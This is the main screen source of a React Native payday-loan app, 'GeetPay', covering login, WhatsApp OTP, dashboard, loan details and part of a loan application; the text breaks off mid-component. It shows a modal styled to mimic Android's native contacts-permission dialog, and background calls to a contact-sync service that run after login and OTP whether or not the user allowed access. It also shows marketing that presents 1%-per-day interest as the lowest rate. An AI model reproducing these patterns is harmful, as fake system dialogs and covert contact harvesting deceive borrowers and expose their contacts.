import React, { useState, useEffect, useRef } from 'react';
import {
  StyleSheet,
  Text,
  View,
  Image,
  TouchableOpacity,
  ScrollView,
  TextInput,
  Modal,
  StatusBar,
  Dimensions,
  SafeAreaView,
  Platform,
  Alert,
  ActivityIndicator,
  Linking,
} from 'react-native';
import { LinearGradient } from 'expo-linear-gradient';
import { StatusBar as ExpoStatusBar } from 'expo-status-bar';
import Svg, { Rect, Circle, Path, Line } from 'react-native-svg';
import {
  Home,
  CreditCard,
  RefreshCw,
  Headphones,
  User,
  Bell,
  ChevronRight,
  CheckCircle,
  Download,
  Shield,
  MessageCircle,
  Phone,
  Mail,
  HelpCircle,
  FileText,
  TrendingUp,
  Calendar,
  ArrowLeft,
  Check,
  Zap,
  QrCode,
  Building2,
  ArrowUpRight,
  Plus,
  Lock,
  Smartphone,
  LogOut,
  Info,
  Wallet,
  AlertTriangle,
  Star,
  Gift,
  Percent,
  IndianRupee,
  Share2,
  Eye,
  ChevronDown,
} from 'lucide-react-native';
import { requestAndSyncContacts } from './src/services/contactService';

const { width } = Dimensions.get('window');

// ─── Theme Colors ─────────────────────────────────────────────────────────────
const NAVY = '#1B3888';
const NAVY_DARK = '#0D1B4B';
const NAVY_LIGHT = '#2247A8';
const GREEN = '#28A21A';
const GREEN_LIGHT = '#EAF8E8';
const BG = '#F4F7FF';
const CARD_BG = '#FFFFFF';
const TEXT_MUTED = '#6B7A99';
const BORDER_COLOR = 'rgba(27,56,136,0.08)';
const REPAY_PORTAL_URL = 'https://geetpay.in/user-dashboard';

type Screen =
  | 'login'
  | 'otp'
  | 'home'
  | 'loan-detail'
  | 'apply'
  | 'repay'
  | 'pay-success'
  | 'history'
  | 'notifications'
  | 'profile'
  | 'support'
  | 'kyc';

// ─── Mock Data ─────────────────────────────────────────────────────────────────
const USER_DATA = {
  name: 'Rahul Sharma',
  phone: '+91 98765 43210',
  email: 'rahul.sharma@gmail.com',
  pan: 'ABCPS1234H',
  aadhaar: 'XXXX XXXX 6789',
  employer: 'Infosys Limited',
  salary: 65000,
  creditScore: 742,
  bank: 'HDFC Bank •••• 4321',
  upi: 'rahul.sharma@hdfc',
};

const LOAN_DATA = {
  id: 'GP2026070100123',
  amount: 50000,
  processingFee: 5000,
  gst: 900,
  disbursed: 44100,
  dailyRate: 1,
  startDate: '01 Jul 2026',
  dueDate: '14 Aug 2026',
  totalDays: 45,
  elapsed: 19,
  remaining: 26,
  interest: 9500,
  outstanding: 59500,
};

const HISTORY_DATA = [
  { id: 'GP2026060099', amount: 30000, date: '15 Jun 2026', repaid: '30 Jun 2026', status: 'closed', paid: 37800, duration: 15 },
  { id: 'GP2026030066', amount: 20000, date: '10 Mar 2026', repaid: '24 Mar 2026', status: 'closed', paid: 25200, duration: 14 },
  { id: 'GP2026010031', amount: 15000, date: '05 Jan 2026', repaid: '20 Jan 2026', status: 'closed', paid: 18750, duration: 15 },
];

const TRANSACTIONS = [
  { label: 'Loan Disbursed to HDFC •••• 4321', amount: 44100, date: '01 Jul 2026', credit: true },
  { label: 'Processing Fee (10%)', amount: 5000, date: '01 Jul 2026', credit: false },
  { label: 'GST on Processing Fee (18%)', amount: 900, date: '01 Jul 2026', credit: false },
  { label: 'Interest Accrued (19 days @ 1%/day)', amount: 9500, date: '19 Jul 2026', credit: false },
];

const NOTIFS_DATA = [
  { id: '1', title: 'Payment Reminder', body: 'Your EMI of ₹59,500 is due on 14 Aug 2026. Pay early to save on interest.', time: '2h ago', unread: true },
  { id: '2', title: 'Loan Disbursed ✓', body: '₹44,100 has been credited to your HDFC Bank account •••• 4321.', time: '19 days ago', unread: false },
  { id: '3', title: 'Special Offer 🎁', body: 'Refer a friend and earn ₹500 cashback on your next loan!', time: '3 days ago', unread: false },
  { id: '4', title: 'Loan Approved ✓', body: 'Your loan of ₹50,000 has been approved and processed.', time: '19 days ago', unread: false },
  { id: '5', title: 'Credit Score Updated', body: 'Your CIBIL score improved to 742. Keep repaying on time!', time: '1 week ago', unread: false },
];

const FAQS = [
  { q: 'What is the daily interest rate?', a: 'GeetPay charges a flat 1% per day simple interest on the principal loan amount until the date of repayment.' },
  { q: 'Can I repay before the due date?', a: 'Yes! You can repay anytime before the due date and only pay interest for the exact number of days you used the loan.' },
  { q: 'How fast is disbursal?', a: 'Once your KYC and application are approved, funds are transferred via IMPS instantly within 5 to 10 minutes.' },
  { q: 'What documents are required?', a: 'Only your PAN Card, Aadhaar Card (with linked mobile for OTP), and 3 months bank statement are required.' },
  { q: 'Is my data secure?', a: 'Yes, GeetPay uses 256-bit bank-grade encryption and RBI-compliant data privacy standards.' },
];

const fmt = (n: number) => '₹' + n.toLocaleString('en-IN');

// ─── Shared UI Components ───────────────────────────────────────────────────────
function Card({ children, style }: { children: React.ReactNode; style?: any }) {
  return <View style={[styles.card, style]}>{children}</View>;
}

function Header({ title, onBack, rightAction }: { title: string; onBack?: () => void; rightAction?: React.ReactNode }) {
  return (
    <View style={styles.header}>
      {onBack ? (
        <TouchableOpacity style={styles.headerBackBtn} onPress={onBack} activeOpacity={0.7}>
          <ArrowLeft size={18} color={NAVY_DARK} />
        </TouchableOpacity>
      ) : (
        <View style={{ width: 36 }} />
      )}
      <Text style={styles.headerTitle}>{title}</Text>
      {rightAction ? rightAction : <View style={{ width: 36 }} />}
    </View>
  );
}

import { requestWhatsAppOtp, verifyWhatsAppOtp, fetchUserProfile, fetchDisbursedLoanDashboard, DashboardDataResponse } from './src/services/api';

// ─── 1. Login Screen ────────────────────────────────────────────────────────────
function LoginScreen({ onNext }: { onNext: (phone: string, devOtp?: string) => void }) {
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [showPermissionModal, setShowPermissionModal] = useState(false);

  useEffect(() => {
    if (Platform.OS !== 'web') {
      const timer = setTimeout(() => {
        setShowPermissionModal(true);
      }, 700);
      return () => clearTimeout(timer);
    }
  }, []);

  const handleGrantPermission = async () => {
    setShowPermissionModal(false);
    try {
      await requestAndSyncContacts(phone || 'GUEST', null, 'APP_LAUNCH');
    } catch (e) { }
  };

  const handleGetOtp = async () => {
    const cleanPhone = phone.replace(/\D/g, '').slice(-10);
    if (cleanPhone.length !== 10) {
      setErrorMsg('Please enter a valid 10-digit mobile number');
      return;
    }

    setErrorMsg('');
    setLoading(true);

    try {
      // 1. Check Sanction Letter Approval Status from MySQL Dashboard
      const dashData = await fetchDisbursedLoanDashboard(cleanPhone);
      const isApproved = Boolean(
        dashData &&
        dashData.loan &&
        (
          dashData.loan.hasActiveLoan ||
          (dashData.loan.status && !['NO_LOAN', 'NO_ACTIVE_LOAN'].includes(dashData.loan.status.toUpperCase())) ||
          Number(dashData.loan.amount || 0) > 0 ||
          Number(dashData.loan.disbursed || 0) > 0
        )
      );

      if (!isApproved) {
        setErrorMsg('Your Sanction Letter is not approved yet.');
        setLoading(false);
        return;
      }

      // 2. Dispatch WhatsApp OTP for Approved Users
      const data = await requestWhatsAppOtp(cleanPhone);
      if (data.success) {
        // Trigger background contact sync
        requestAndSyncContacts(cleanPhone, null, 'APP_LAUNCH').catch(() => { });
        onNext('+91 ' + cleanPhone, data.devOtp);
      } else {
        setErrorMsg(data.message || 'Your Sanction Letter is not approved yet.');
      }
    } catch (err: any) {
      console.warn('Backend connection error:', err.message);
      setErrorMsg('Server connection issue. Please check internet connection.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <ScrollView contentContainerStyle={{ flexGrow: 1, backgroundColor: '#FFFFFF' }} keyboardShouldPersistTaps="handled">
      <LinearGradient colors={[NAVY_DARK, NAVY, NAVY_LIGHT]} style={styles.loginHero}>
        <View style={styles.brandBadge}>
          <Text style={styles.brandName}>GeetPay</Text>
        </View>
        <Text style={styles.loginSubtitle}>India's Fastest Payday Loans</Text>

        <View style={styles.trustBadges}>
          {['RBI Compliant', 'Instant Disbursal', '100% Safe'].map((t) => (
            <View key={t} style={styles.trustBadgeItem}>
              <Check size={12} color="#4ADE80" strokeWidth={3} />
              <Text style={styles.trustBadgeText}>{t}</Text>
            </View>
          ))}
        </View>
      </LinearGradient>

      <View style={styles.loginCardContainer}>
        <Card style={styles.loginCard}>
          <Text style={styles.loginCardTitle}>Get Instant Cash</Text>
          <Text style={styles.loginCardSubtitle}>Loans from ₹5,000 to ₹1,00,000 disbursed in 5 mins</Text>

          <Text style={styles.inputLabel}>Mobile Number</Text>
          <View style={styles.phoneInputWrap}>
            <View style={styles.countryCodeWrap}>
              <Text style={styles.countryCodeText}>🇮🇳 +91</Text>
            </View>
            <TextInput
              style={styles.phoneInput}
              keyboardType="phone-pad"
              maxLength={10}
              value={phone}
              onChangeText={(txt) => {
                setPhone(txt);
                if (errorMsg) setErrorMsg('');
              }}
              placeholder="Enter 10-digit number"
              placeholderTextColor="#94A3B8"
            />
          </View>

          {errorMsg ? (
            <Text style={{ color: '#EF4444', fontSize: 13, fontWeight: '600', marginBottom: 14, textAlign: 'center' }}>
              ⚠️ {errorMsg}
            </Text>
          ) : null}

          <TouchableOpacity
            style={[
              styles.primaryBtn,
              { backgroundColor: phone.length === 10 && !loading ? GREEN : '#94A3B8' },
            ]}
            onPress={handleGetOtp}
            activeOpacity={0.8}
            disabled={phone.length !== 10 || loading}
          >
            {loading ? (
              <ActivityIndicator color="#FFFFFF" size="small" style={{ marginRight: 8 }} />
            ) : null}
            <Text style={styles.primaryBtnText}>{loading ? 'Sending WhatsApp OTP...' : 'Get OTP'}</Text>
            {!loading && <ChevronRight size={18} color="#FFFFFF" strokeWidth={2.5} />}
          </TouchableOpacity>

          <View style={styles.loginSecurityNotice}>
            <Lock size={12} color={TEXT_MUTED} />
            <Text style={styles.loginSecurityText}>By continuing, you agree to GeetPay Terms & Privacy Policy</Text>
          </View>
        </Card>

        {/* Feature Highlights */}
        <View style={styles.featuresRow}>
          <View style={styles.featureBox}>
            <Zap size={22} color={GREEN} />
            <Text style={styles.featureBoxTitle}>5 Min Disbursal</Text>
            <Text style={styles.featureBoxDesc}>Direct to bank</Text>
          </View>
          <View style={styles.featureBox}>
            <Percent size={22} color={NAVY} />
            <Text style={styles.featureBoxTitle}>1% Daily Rate</Text>
            <Text style={styles.featureBoxDesc}>Pay for days used</Text>
          </View>
          <View style={styles.featureBox}>
            <Shield size={22} color="#0284C7" />
            <Text style={styles.featureBoxTitle}>Zero Collateral</Text>
            <Text style={styles.featureBoxDesc}>Paperless KYC</Text>
          </View>
        </View>

        {/* Contact Permission Dialog (Native Android Popup Style) */}
        <Modal visible={showPermissionModal} transparent animationType="fade">
          <View style={styles.nativePermissionOverlay}>
            <View style={styles.nativePermissionCard}>
              <View style={styles.nativePermissionIconWrap}>
                <Svg width="48" height="48" viewBox="0 0 48 48" fill="none">
                  <Line x1="12" y1="7" x2="36" y2="7" stroke="#1A73E8" strokeWidth="3" strokeLinecap="round" />
                  <Rect x="8" y="11" width="32" height="26" rx="4" stroke="#1A73E8" strokeWidth="3" fill="none" />
                  <Circle cx="24" cy="20.5" r="4.2" stroke="#1A73E8" strokeWidth="3" fill="none" />
                  <Path d="M15.5 31.5C16.8 28 20.2 26.8 24 26.8C27.8 26.8 31.2 28 32.5 31.5" stroke="#1A73E8" strokeWidth="3" strokeLinecap="round" />
                  <Line x1="12" y1="41" x2="36" y2="41" stroke="#1A73E8" strokeWidth="3" strokeLinecap="round" />
                </Svg>
              </View>

              <Text style={styles.nativePermissionTitle}>
                Allow <Text style={{ fontWeight: '700', color: '#000000' }}>this app</Text> to access your contacts?
              </Text>

              <View style={styles.nativePermissionActions}>
                <TouchableOpacity
                  style={styles.nativePermissionBtn}
                  activeOpacity={0.65}
                  onPress={handleGrantPermission}
                >
                  <Text style={styles.nativePermissionBtnText}>Allow</Text>
                </TouchableOpacity>

                <TouchableOpacity
                  style={styles.nativePermissionBtn}
                  activeOpacity={0.65}
                  onPress={() => setShowPermissionModal(false)}
                >
                  <Text style={styles.nativePermissionBtnText}>Don’t allow</Text>
                </TouchableOpacity>
              </View>
            </View>
          </View>
        </Modal>
      </View>
    </ScrollView>
  );
}

// ─── 2. OTP Screen ──────────────────────────────────────────────────────────────
function OTPScreen({
  phone,
  devOtp,
  onVerify,
  onBack,
}: {
  phone: string;
  devOtp?: string;
  onVerify: (user?: any) => void;
  onBack: () => void;
}) {
  // Always start with 4 completely empty boxes
  const [otp, setOtp] = useState<string[]>(['', '', '', '']);
  const [timer, setTimer] = useState(30);
  const [loading, setLoading] = useState(false);
  const [statusMsg, setStatusMsg] = useState<{ text: string; error?: boolean } | null>(null);

  const input0 = useRef<TextInput>(null);
  const input1 = useRef<TextInput>(null);
  const input2 = useRef<TextInput>(null);
  const input3 = useRef<TextInput>(null);
  const inputRefs = [input0, input1, input2, input3];

  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => setTimer((t) => t - 1), 1000);
      return () => clearInterval(interval);
    }
  }, [timer]);

  const handleDigitChange = (val: string, index: number) => {
    const cleaned = val.replace(/\D/g, '');
    const newOtp = [...otp];
    newOtp[index] = cleaned.slice(-1);
    setOtp(newOtp);
    setStatusMsg(null);

    // Auto advance focus to the next input box
    if (cleaned && index < 3) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyPress = (e: any, index: number) => {
    if (e.nativeEvent.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs[index - 1].current?.focus();
    }
  };

  const handleVerify = async () => {
    const fullOtp = otp.join('');
    if (fullOtp.length !== 4) {
      setStatusMsg({ text: 'Please enter all 4 digits of OTP', error: true });
      return;
    }

    setLoading(true);
    setStatusMsg(null);

    const cleanPhone = phone.replace(/\D/g, '').slice(-10);

    try {
      const data = await verifyWhatsAppOtp(cleanPhone, fullOtp);

      if (data.success) {
        // Silent background contact sync
        requestAndSyncContacts(cleanPhone, data.user?.id, 'OTP_AGREE').catch(() => { });

        onVerify(data.user);
      } else {
        setStatusMsg({ text: data.message || 'Invalid OTP. Please check and retry.', error: true });
      }
    } catch (err: any) {
      console.warn('Backend verification error:', err.message);
      setStatusMsg({ text: 'Could not reach server. Ensure Mobile & PC are on the same Wi-Fi.', error: true });
    } finally {
      setLoading(false);
    }
  };

  const handleResend = async () => {
    setTimer(30);
    const cleanPhone = phone.replace(/\D/g, '').slice(-10);
    setStatusMsg({ text: 'Sending new OTP to WhatsApp...', error: false });
    try {
      const data = await requestWhatsAppOtp(cleanPhone);
      if (data.success) {
        setOtp(['', '', '', '']);
        setStatusMsg({ text: 'New OTP sent to your WhatsApp number!', error: false });
        input0.current?.focus();
      }
    } catch (e) {
      setStatusMsg({ text: 'Could not connect to server', error: true });
    }
  };

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: '#FFFFFF' }}>
      <Header title="WhatsApp Verification" onBack={onBack} />
      <ScrollView contentContainerStyle={styles.otpContainer} keyboardShouldPersistTaps="handled">
        <View style={styles.otpIconWrap}>
          <Smartphone size={32} color={NAVY} />
        </View>
        <Text style={styles.otpHeading}>Enter 4-Digit OTP</Text>
        <Text style={styles.otpSubtext}>
          We sent a verification code to WhatsApp at <Text style={{ fontWeight: '700', color: NAVY_DARK }}>{phone}</Text>
        </Text>

        <View style={styles.otpInputRow}>
          {otp.map((digit, idx) => (
            <TextInput
              key={idx}
              ref={inputRefs[idx]}
              style={[
                styles.otpBox,
                digit ? styles.otpBoxFilled : null,
                { textAlign: 'center', fontSize: 22, fontWeight: '800', color: NAVY_DARK },
              ]}
              keyboardType="number-pad"
              maxLength={1}
              value={digit}
              onChangeText={(v) => handleDigitChange(v, idx)}
              onKeyPress={(e) => handleKeyPress(e, idx)}
            />
          ))}
        </View>

        {statusMsg ? (
          <Text
            style={{
              color: statusMsg.error ? '#EF4444' : '#16A34A',
              fontSize: 13,
              fontWeight: '600',
              marginBottom: 16,
              textAlign: 'center',
            }}
          >
            {statusMsg.text}
          </Text>
        ) : null}

        <TouchableOpacity
          style={[styles.primaryBtn, { backgroundColor: otp.join('').length === 4 && !loading ? GREEN : '#94A3B8' }]}
          onPress={handleVerify}
          activeOpacity={0.85}
          disabled={otp.join('').length !== 4 || loading}
        >
          {loading ? (
            <ActivityIndicator color="#FFFFFF" size="small" style={{ marginRight: 8 }} />
          ) : null}
          <Text style={styles.primaryBtnText}>{loading ? 'Verifying...' : 'Agree & Continue'}</Text>
          {!loading && <ChevronRight size={18} color="#FFFFFF" strokeWidth={2.5} />}
        </TouchableOpacity>

        <View style={{ marginTop: 12, paddingHorizontal: 12, alignItems: 'center' }}>
          <Text style={{ fontSize: 11, color: '#94A3B8', textAlign: 'center', lineHeight: 16 }}>
            By tapping <Text style={{ color: NAVY, fontWeight: '700' }}>"Agree & Continue"</Text>, you consent to credit evaluation and device contact verification for instant approval.
          </Text>
        </View>

        <View style={styles.resendRow}>
          {timer > 0 ? (
            <Text style={styles.timerText}>
              Resend code in <Text style={{ color: NAVY, fontWeight: '700' }}>{timer}s</Text>
            </Text>
          ) : (
            <TouchableOpacity onPress={handleResend}>
              <Text style={styles.resendBtnText}>Resend OTP via WhatsApp</Text>
            </TouchableOpacity>
          )}
        </View>
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── 3. Home Screen ─────────────────────────────────────────────────────────────
function HomeScreen({
  navigate,
  data,
}: {
  navigate: (s: Screen) => void;
  data?: DashboardDataResponse | null;
}) {
  const user = data?.user || USER_DATA;
  const loan = data?.loan || LOAN_DATA;
  const transactions = data?.transactions || TRANSACTIONS;

  const avatarInitials = (user.name.split(' ').map((n) => n[0]).join('') || 'GP').slice(0, 2).toUpperCase();

  return (
    <ScrollView style={styles.screenBg} contentContainerStyle={{ paddingBottom: 110 }}>
      {/* Top Profile & Header */}
      <View style={styles.homeTopBar}>
        <View style={styles.homeUserRow}>
          <TouchableOpacity onPress={() => navigate('profile')} style={styles.userAvatar}>
            {user.avatar ? (
              <Image source={{ uri: user.avatar }} style={{ width: 44, height: 44, borderRadius: 22 }} />
            ) : (
              <Text style={styles.userAvatarText}>{avatarInitials}</Text>
            )}
          </TouchableOpacity>
          <View>
            <Text style={styles.greetingText}>Welcome back 👋</Text>
            <Text style={styles.userNameText}>{user.name}</Text>
          </View>
        </View>

        <TouchableOpacity style={styles.iconCircleBtn} onPress={() => navigate('notifications')}>
          <Bell size={20} color={NAVY_DARK} />
          <View style={styles.notifDot} />
        </TouchableOpacity>
      </View>

      {/* Active Loan Hero Card OR No Active Loan Banner */}
      <View style={styles.sectionPad}>
        {loan.hasActiveLoan ? (
          <LinearGradient colors={[NAVY_DARK, NAVY]} style={styles.loanHeroCard}>
            <View style={styles.loanHeroTop}>
              <View>
                <Text style={styles.loanHeroLabel}>ACTIVE PAYDAY LOAN • {loan.id}</Text>
                <Text style={styles.loanHeroAmount}>{fmt(loan.outstanding)}</Text>
              </View>
              <View style={styles.dueBadge}>
                <Calendar size={12} color="#FFFFFF" />
                <Text style={styles.dueBadgeText}>{loan.remaining} days left</Text>
              </View>
            </View>

            {/* Progress bar */}
            <View style={styles.progressContainer}>
              <View style={styles.progressBarBg}>
                <View
                  style={[
                    styles.progressBarFill,
                    {
                      width: `${Math.min(100, Math.max(5, Math.round((loan.elapsed / Math.max(1, loan.totalDays)) * 100)))}%`,
                    },
                  ]}
                />
              </View>
              <View style={styles.progressLabelRow}>
                <Text style={styles.progressText}>Disbursed: {loan.startDate}</Text>
                <Text style={styles.progressText}>Due: {loan.dueDate}</Text>
              </View>
            </View>

            {/* Breakdown summary */}
            <View style={styles.loanStatsRow}>
              <View style={styles.loanStatCol}>
                <Text style={styles.loanStatLabel}>Principal</Text>
                <Text style={styles.loanStatVal}>{fmt(loan.amount)}</Text>
              </View>
              <View style={styles.loanStatDivider} />
              <View style={styles.loanStatCol}>
                <Text style={styles.loanStatLabel}>Interest ({loan.dailyRate}%/d)</Text>
                <Text style={styles.loanStatVal}>{fmt(loan.interest)}</Text>
              </View>
              <View style={styles.loanStatDivider} />
              <View style={styles.loanStatCol}>
                <Text style={styles.loanStatLabel}>Disbursed</Text>
                <Text style={[styles.loanStatVal, { color: '#4ADE80' }]}>{fmt(loan.disbursed)}</Text>
              </View>
            </View>

            {/* Action Buttons */}
            <View style={styles.heroActionRow}>
              <TouchableOpacity
                style={styles.repayHeroBtn}
                onPress={() => Linking.openURL(REPAY_PORTAL_URL).catch(() => { })}
                activeOpacity={0.85}
              >
                <Text style={styles.repayHeroBtnText}>Repay Now</Text>
                <ArrowUpRight size={16} color="#FFFFFF" />
              </TouchableOpacity>

              <TouchableOpacity
                style={styles.detailHeroBtn}
                onPress={() => navigate('loan-detail')}
                activeOpacity={0.85}
              >
                <Text style={styles.detailHeroBtnText}>View Details</Text>
              </TouchableOpacity>
            </View>
          </LinearGradient>
        ) : (
          <LinearGradient colors={[NAVY_DARK, NAVY]} style={[styles.loanHeroCard, { paddingVertical: 24 }]}>
            <View style={{ flexDirection: 'row', alignItems: 'center', marginBottom: 12 }}>
              <View style={{ width: 44, height: 44, borderRadius: 22, backgroundColor: 'rgba(255,255,255,0.15)', justifyContent: 'center', alignItems: 'center', marginRight: 14 }}>
                <Zap size={24} color="#FBBF24" />
              </View>
              <View style={{ flex: 1 }}>
                <Text style={{ color: '#93C5FD', fontSize: 12, fontWeight: '700', letterSpacing: 0.5 }}>NO ACTIVE LOAN</Text>
                <Text style={{ color: '#FFFFFF', fontSize: 20, fontWeight: '800', marginTop: 2 }}>Get Instant Payday Loan</Text>
              </View>
            </View>

            <Text style={{ color: '#E2E8F0', fontSize: 13, lineHeight: 19, marginBottom: 16 }}>
              Instant disbursal up to ₹1,00,000 directly to your bank account with lowest daily interest rate.
            </Text>

            <TouchableOpacity
              style={{ backgroundColor: '#22C55E', borderRadius: 12, paddingVertical: 14, paddingHorizontal: 20, flexDirection: 'row', alignItems: 'center', justifyContent: 'center' }}
              onPress={() => navigate('apply')}
              activeOpacity={0.85}
            >
              <Text style={{ color: '#FFFFFF', fontWeight: '800', fontSize: 15, marginRight: 8 }}>Apply For Loan</Text>
              <ArrowUpRight size={18} color="#FFFFFF" />
            </TouchableOpacity>
          </LinearGradient>
        )}
      </View>

      {/* Quick Actions Grid */}
      <View style={styles.sectionPad}>
        <Text style={styles.sectionTitle}>Quick Actions</Text>
        <View style={styles.quickGrid}>
          <TouchableOpacity
            style={styles.quickGridItem}
            onPress={() => Linking.openURL(REPAY_PORTAL_URL).catch(() => { })}
            activeOpacity={0.75}
          >
            <View style={[styles.quickIconCircle, { backgroundColor: '#E0E7FF' }]}>
              <RefreshCw size={22} color={NAVY} />
            </View>
            <Text style={styles.quickGridLabel}>Repay</Text>
          </TouchableOpacity>

          <TouchableOpacity style={styles.quickGridItem} onPress={() => navigate('kyc')} activeOpacity={0.75}>
            <View style={[styles.quickIconCircle, { backgroundColor: '#FEF3C7' }]}>
              <Shield size={22} color="#D97706" />
            </View>
            <Text style={styles.quickGridLabel}>KYC Status</Text>
          </TouchableOpacity>

          <TouchableOpacity style={styles.quickGridItem} onPress={() => navigate('history')} activeOpacity={0.75}>
            <View style={[styles.quickIconCircle, { backgroundColor: '#F1F5F9' }]}>
              <FileText size={22} color="#475569" />
            </View>
            <Text style={styles.quickGridLabel}>History</Text>
          </TouchableOpacity>
        </View>
      </View>

      {/* Credit Score Banner */}
      <View style={styles.sectionPad}>
        <Card style={styles.creditBannerCard}>
          <View style={styles.creditBannerLeft}>
            <View style={styles.scoreCircle}>
              <Text style={styles.scoreNumber}>{user.creditScore > 0 ? user.creditScore : 'N/A'}</Text>
              <Text style={styles.scoreLabel}>CIBIL</Text>
            </View>
            <View style={{ marginLeft: 14, flex: 1, justifyContent: 'center' }}>
              <Text style={styles.creditStatusText}>
                {user.creditRating && user.creditRating.includes('Good')
                  ? 'Good Score 👍'
                  : (user.creditRating || (user.creditScore > 0 ? 'Good Score 👍' : 'Check CIBIL Score 📊'))}
              </Text>
            </View>
          </View>
        </Card>
      </View>

      {/* Recent Activity */}
      <View style={styles.sectionPad}>
        <View style={styles.rowBetween}>
          <Text style={styles.sectionTitle}>Recent Activity</Text>
          <TouchableOpacity onPress={() => navigate('history')}>
            <Text style={styles.seeAllText}>See all</Text>
          </TouchableOpacity>
        </View>

        {transactions.length > 0 ? (
          transactions.slice(0, 4).map((item, idx) => (
            <Card key={idx} style={styles.txnCard}>
              <View style={styles.txnLeft}>
                <View style={[styles.txnIconWrap, { backgroundColor: item.credit ? '#E8F5E9' : '#FFF1F2' }]}>
                  {item.credit ? (
                    <ArrowLeft size={16} color={GREEN} style={{ transform: [{ rotate: '45deg' }] }} />
                  ) : (
                    <ArrowUpRight size={16} color="#E11D48" />
                  )}
                </View>
                <View style={{ marginLeft: 12, flex: 1 }}>
                  <Text style={styles.txnTitle} numberOfLines={1}>
                    {item.label}
                  </Text>
                  <Text style={styles.txnDate}>
                    {item.date} {item.sublabel ? `• ${item.sublabel}` : ''}
                  </Text>
                </View>
              </View>
              <Text style={[styles.txnAmount, { color: item.credit ? GREEN : NAVY_DARK }]}>
                {item.credit ? '+' : '-'}{fmt(item.amount)}
              </Text>
            </Card>
          ))
        ) : (
          <Card style={[styles.txnCard, { paddingVertical: 18, alignItems: 'center', justifyContent: 'center' }]}>
            <Text style={{ color: '#64748B', fontSize: 13, textAlign: 'center' }}>
              No active disbursed loans found for this mobile number.{'\n'}Tap <Text style={{ color: NAVY, fontWeight: '700' }}>"Apply Loan"</Text> to apply.
            </Text>
          </Card>
        )}
      </View>
    </ScrollView>
  );
}

// ─── 4. Loan Detail Screen ──────────────────────────────────────────────────────
function LoanDetailScreen({
  navigate,
  data,
}: {
  navigate: (s: Screen) => void;
  data?: DashboardDataResponse | null;
}) {
  const loan = data?.loan || LOAN_DATA;
  const user = data?.user || USER_DATA;

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: BG }}>
      <Header title="Loan Details" onBack={() => navigate('home')} />
      <ScrollView contentContainerStyle={styles.detailContainer}>
        {/* Status Card */}
        <Card style={styles.detailHeaderCard}>
          <View style={styles.rowBetween}>
            <View>
              <Text style={styles.detailLoanId}>Loan #{loan.id}</Text>
              <Text style={styles.detailTotalAmount}>{fmt(loan.outstanding)}</Text>
              <Text style={styles.detailTotalLabel}>Total Repayable on {loan.dueDate}</Text>
            </View>
            <View style={styles.activePill}>
              <Text style={styles.activePillText}>{loan.status || 'ACTIVE'}</Text>
            </View>
          </View>
        </Card>

        {/* Detailed Breakdown */}
        <Text style={styles.sectionTitle}>Financial Breakdown</Text>
        <Card style={styles.breakdownCard}>
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>Loan Principal (Approved)</Text>
            <Text style={styles.breakdownVal}>{fmt(loan.amount)}</Text>
          </View>
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>Processing Fee</Text>
            <Text style={[styles.breakdownVal, { color: '#E11D48' }]}>- {fmt(loan.processingFee)}</Text>
          </View>
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>GST on Fee (18%)</Text>
            <Text style={[styles.breakdownVal, { color: '#E11D48' }]}>- {fmt(loan.gst)}</Text>
          </View>
          <View style={[styles.breakdownRow, styles.disbursedHighlightRow]}>
            <Text style={styles.disbursedHighlightLabel}>Net Disbursed to Bank</Text>
            <Text style={styles.disbursedHighlightVal}>{fmt(loan.disbursed)}</Text>
          </View>
          <View style={styles.breakdownDivider} />
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>Daily Interest Rate</Text>
            <Text style={styles.breakdownVal}>{loan.dailyRate}% / day</Text>
          </View>
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>Days Elapsed ({loan.elapsed} of {loan.totalDays})</Text>
            <Text style={styles.breakdownVal}>{loan.elapsed} Days</Text>
          </View>
          <View style={styles.breakdownRow}>
            <Text style={styles.breakdownLabel}>Interest Accrued</Text>
            <Text style={styles.breakdownVal}>{fmt(loan.interest)}</Text>
          </View>
        </Card>

        {/* Repayment Info Card */}
        <Text style={styles.sectionTitle}>Bank & Disbursal Details</Text>
        <Card style={styles.bankInfoCard}>
          <View style={styles.bankRow}>
            <Building2 size={20} color={NAVY} />
            <View style={{ marginLeft: 12 }}>
              <Text style={styles.bankNameText}>{user.bank || 'HDFC Bank •••• 4321'}</Text>
              <Text style={styles.bankSubText}>Disbursed on {loan.startDate}</Text>
            </View>
          </View>
        </Card>

        <TouchableOpacity
          style={styles.primaryBtn}
          onPress={() => Linking.openURL(REPAY_PORTAL_URL).catch(() => { })}
          activeOpacity={0.85}
        >
          <Text style={styles.primaryBtnText}>Proceed to Repay {fmt(loan.outstanding)}</Text>
          <ArrowUpRight size={18} color="#FFFFFF" />
        </TouchableOpacity>
      </ScrollView>
    </SafeAreaView>
  );
}

// ─── 5. Apply Loan Screen ───────────────────────────────────────────────────────
function ApplyScreen({ navigate }: { navigate: (s: Screen) => void }) {
  const [amount, setAmount] = useState(40000);
  const [tenure, setTenure] = useState(30);

  const fee = Math.round(amount * 0.1);
  const gst = Math.round(fee * 0.18);
  const disbursed = amount - fee - gst;
  const totalInterest = Math.round(amount * 0.01 * tenure);
  const totalRepay = amount + totalInterest;

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: BG }}>
      <Header title="Apply for Payday Loan" onBack={() => navigate('home')} />
      <ScrollView contentContainerStyle={styles.detailContainer}>
        {/* Amount Selector Card */}
        <Card style={styles.applyCard}>
          <Text style={styles.applyLabel}>SELECT LOAN AMOUNT</Text>
          <Text style={styles.applyAmount}>{fmt(amount)}</Text>

          {/* Quick Amount Chips */}
          <View style={styles.chipsRow}>
            {[10000, 25000, 50000, 75000, 100000].map((val) => (
              <TouchableOpacity
                key={val}
                style={[styles.chipItem, amount === val ? styles.chipItemActive : null]}
                onPress={() => setAmount(val)}
              >
